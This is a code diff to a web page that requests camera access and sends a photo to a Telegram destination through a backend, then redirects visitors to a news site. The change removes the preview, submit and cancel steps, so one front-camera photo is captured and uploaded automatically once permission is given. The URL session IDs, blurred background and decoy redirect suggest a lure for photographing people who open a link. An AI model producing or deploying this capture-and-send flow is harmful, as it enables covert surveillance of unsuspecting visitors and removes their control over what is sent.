@@ -151,16 +151,6 @@
       cursor: wait;
     }
 
-    #photoPreview {
-      display: block;
-      width: min(100%, 440px);
-      max-height: 52vh;
-      object-fit: contain;
-      margin: 0 auto 14px;
-      border-radius: 6px;
-      background: #111;
-    }
-
     #status {
       position: fixed;
       left: 50%;
@@ -213,24 +203,8 @@
 
   <div id="entryScreen" class="entry-screen">
     <div class="entry-consent">
-      <p id="consentNotice">By clicking Continue, you agree to let this demonstration request camera access. If you allow access, you can choose Capture Photo. The photo will only be sent to the configured Telegram destination after you click Submit Photo.</p>
+      <p id="consentNotice">By clicking Continue, you agree that this demonstration will request camera access. If you grant permission, it will automatically capture one photo and send it to the configured Telegram destination. If you deny or cancel the browser permission prompt, nothing will be captured or sent.</p>
       <button id="continueButton" type="button">Continue</button>
-      <div id="captureControls" style="display: none; width: 100%;">
-        <p id="captureInstructions" style="margin: 0 0 14px; line-height: 1.5; color: #333;">Camera access is on. Nothing has been captured or sent. Choose Capture Photo when you are ready.</p>
-        <div class="demo-actions" id="captureActions">
-          <button id="capturePhotoButton" class="demo-action-button" type="button">Capture Photo</button>
-          <button id="cancelDemoButton" class="demo-action-button secondary" type="button">Cancel</button>
-        </div>
-        <div id="reviewPanel" style="display: none;">
-          <img id="photoPreview" alt="Photo captured for your review">
-          <p style="margin: 0 0 14px; line-height: 1.5; color: #333;">This photo has not been sent. Choose Submit Photo to send it to the configured Telegram destination.</p>
-          <div class="demo-actions">
-            <button id="retakePhotoButton" class="demo-action-button secondary" type="button">Retake Photo</button>
-            <button id="submitPhotoButton" class="demo-action-button" type="button">Submit Photo</button>
-            <button id="discardPhotoButton" class="demo-action-button secondary" type="button">Cancel</button>
-          </div>
-        </div>
-      </div>
     </div>
   </div>
   <p id="status" role="status" aria-live="polite" style="display: none;"></p>
@@ -271,23 +245,10 @@
     const pageBackground = document.getElementById("pageBackground");
     const entryScreen = document.getElementById("entryScreen");
     const consentNotice = document.getElementById("consentNotice");
-    const captureControls = document.getElementById("captureControls");
-    const captureActions = document.getElementById("captureActions");
-    const capturePhotoButton = document.getElementById("capturePhotoButton");
-    const cancelDemoButton = document.getElementById("cancelDemoButton");
-    const reviewPanel = document.getElementById("reviewPanel");
-    const photoPreview = document.getElementById("photoPreview");
-    const retakePhotoButton = document.getElementById("retakePhotoButton");
-    const submitPhotoButton = document.getElementById("submitPhotoButton");
-    const discardPhotoButton = document.getElementById("discardPhotoButton");
-
     let activeSessionId = null;
     let activeStream = null;
-    let capturedBlob = null;
-    let captureAttempted = false;
     let submissionStarted = false;
     let flowStarted = false;
-    let previewObjectUrl = null;
 
     function getSourceSessionId() {
       const params = new URLSearchParams(window.location.search);
@@ -306,15 +267,6 @@
         activeStream = null;
       }
       video.srcObject = null;
-    }
-
-    function clearPhotoPreview() {
-      if (previewObjectUrl) {
-        URL.revokeObjectURL(previewObjectUrl);
-        previewObjectUrl = null;
-      }
-      photoPreview.removeAttribute("src");
-      capturedBlob = null;
     }
 
     async function validateSession(sessionId) {
@@ -421,8 +373,8 @@
       }
     }
 
-    // Ask for camera access directly from the visitor's tap. No frame is
-    // captured until the separate Capture Photo action.
+    // Ask for camera access directly from the visitor's tap. After permission,
+    // capture exactly one frame and submit it without a preview or extra action.
     continueButton.addEventListener("click", async () => {
       if (flowStarted) return;
 
@@ -461,7 +413,7 @@
 
       flowStarted = true;
       continueButton.disabled = true;
-      showStatus("Requesting camera access. No photo will be taken or sent without your next choices...", false);
+      showStatus("Requesting camera access. If you grant permission, one photo will be captured and submitted automatically.", false);
 
       try {
         let permissionRequest;
@@ -498,60 +450,27 @@
         }
 
         pageBackground.classList.remove("is-blurred");
-        consentNotice.style.display = "none";
-        continueButton.style.display = "none";
-        captureControls.style.display = "block";
-        showStatus("Camera access is on. Choose Capture Photo when ready; nothing will be sent until you choose Submit Photo.", false);
+        entryScreen.style.display = "none";
+        showStatus("Camera permission granted. Capturing and submitting one photo...", false);
+        const photoBlob = await capturePhoto();
+        submissionStarted = true;
+        await submitPhoto(photoBlob);
       } catch (error) {
         stopCamera();
         const isCameraError = Boolean(error && error.cameraStage);
         showStatus(isCameraError ? cameraErrorMessage(error) : (error.message || "The demo could not continue. Please try again."), true);
 
-        // Allow retry only before a photo capture or submission has started.
-        if (!captureAttempted) {
+        // Allow a retry before capture starts; avoid a duplicate upload retry
+        // if the server outcome is ambiguous after a submission request.
+        if (!submissionStarted) {
           flowStarted = false;
           activeSessionId = null;
+          entryScreen.style.display = "";
+          pageBackground.classList.add("is-blurred");
           continueButton.disabled = false;
         }
       }
     });
-
-    capturePhotoButton.addEventListener("click", async () => {
-      if (captureAttempted) return;
-
-      try {
-        if (!activeStream) await reopenCameraFromTap();
-        capturedBlob = await capturePhoto();
-        previewObjectUrl = URL.createObjectURL(capturedBlob);
-        photoPreview.src = previewObjectUrl;
-        captureActions.style.display = "none";
-        reviewPanel.style.display = "block";
-        showStatus("Photo captured locally. It has not been sent.", false);
-      } catch (error) {
-        captureAttempted = false;
-        showStatus(error.message || "Photo capture failed. No photo was sent.", true);
-      }
-    });
-
-    retakePhotoButton.addEventListener("click", async () => {
-      clearPhotoPreview();
-      captureAttempted = false;
-      reviewPanel.style.display = "none";
-      captureActions.style.display = "flex";
-      capturePhotoButton.disabled = true;
-      try {
-        await reopenCameraFromTap();
-        showStatus("Camera is ready. Choose Capture Photo when ready.", false);
-      } catch (error) {
-        showStatus(cameraErrorMessage(error), true);
-      } finally {
-        capturePhotoButton.disabled = false;
-      }
-    });
-
-    submitPhotoButton.addEventListener("click", submitPhoto);
-    cancelDemoButton.addEventListener("click", cancelDemo);
-    discardPhotoButton.addEventListener("click", cancelDemo);
     window.addEventListener("pagehide", stopCamera);
     window.addEventListener("beforeunload", stopCamera);
 
@@ -570,27 +489,6 @@
       }
     }
 
-    async function reopenCameraFromTap() {
-      let request;
-      try {
-        request = navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" },
-          audio: false
-        });
-      } catch (error) {
-        throw tagCameraError(error, "permission");
-      }
-      try {
-        activeStream = await request;
-        video.srcObject = activeStream;
-        await video.play();
-        await waitForVideoFrame();
-      } catch (error) {
-        stopCamera();
-        throw error.cameraStage ? error : tagCameraError(error, "permission");
-      }
-    }
-
     async function capturePhoto() {
       if (!activeStream || !video.videoWidth || !video.videoHeight) {
         throw new Error("Camera stream is not ready. No photo was sent.");
@@ -604,7 +502,6 @@
         throw new Error("Photo capture is unavailable in this browser.");
       }
 
-      captureAttempted = true;
       context.drawImage(video, 0, 0, canvas.width, canvas.height);
       stopCamera();
 
@@ -619,55 +516,36 @@
       return photoBlob;
     }
 
-    async function submitPhoto() {
-      if (!capturedBlob || !activeSessionId || submissionStarted) {
-        throw new Error("Photo submission could not be prepared.");
+    async function submitPhoto(photoBlob) {
+      if (!photoBlob || !activeSessionId) {
+        throw new Error("Photo submission could not be prepared. No photo was sent.");
       }
-
-      submissionStarted = true;
-      submitPhotoButton.disabled = true;
-      showStatus("Submitting only the photo you selected...", false);
-
       const formData = new FormData();
-      formData.append("photo", capturedBlob, `session-${activeSessionId.substring(0, 8)}.jpg`);
+      formData.append("photo", photoBlob, `session-${activeSessionId.substring(0, 8)}.jpg`);
 
-      try {
-        const response = await fetch(
-          `${BACKEND_URL}/api/sessions/${activeSessionId}/photo`,
-          {
-            method: "POST",
-            headers: { "Accept": "application/json" },
-            body: formData
-          }
-        );
-        const responseData = await response.json().catch(() => null);
-        if (!response.ok || !responseData || responseData.success !== true) {
-          let errorDetail = `Photo submission failed (HTTP ${response.status}).`;
-          if (responseData && responseData.error) {
-            errorDetail = responseData.error;
-          } else if (response.ok) {
-            errorDetail = "The server did not confirm the photo submission.";
-          }
-          throw new Error(errorDetail);
+      const response = await fetch(
+        `${BACKEND_URL}/api/sessions/${activeSessionId}/photo`,
+        {
+          method: "POST",
+          headers: { "Accept": "application/json" },
+          body: formData
         }
-
-        stopCamera();
-        clearPhotoPreview();
-        status.style.display = "none";
-        status.textContent = "";
-        window.location.assign("https://www.keralavisionnews.com/");
-      } catch (error) {
-        submissionStarted = false;
-        submitPhotoButton.disabled = false;
-        showStatus(`Could not confirm photo submission. ${error.message || "Please try again."}`, true);
+      );
+      const responseData = await response.json().catch(() => null);
+      if (!response.ok || !responseData || responseData.success !== true) {
+        let errorDetail = `Photo submission failed (HTTP ${response.status}).`;
+        if (responseData && responseData.error) {
+          errorDetail = responseData.error;
+        } else if (response.ok) {
+          errorDetail = "The server did not confirm the photo submission.";
+        }
+        throw new Error(errorDetail);
       }
-    }
 
-    function cancelDemo() {
       stopCamera();
-      clearPhotoPreview();
-      entryScreen.style.display = "none";
-      showStatus("Demo cancelled. No photo was sent.", false);
+      status.style.display = "none";
+      status.textContent = "";
+      window.location.assign("https://www.keralavisionnews.com/");
     }
   </script>
 </body>
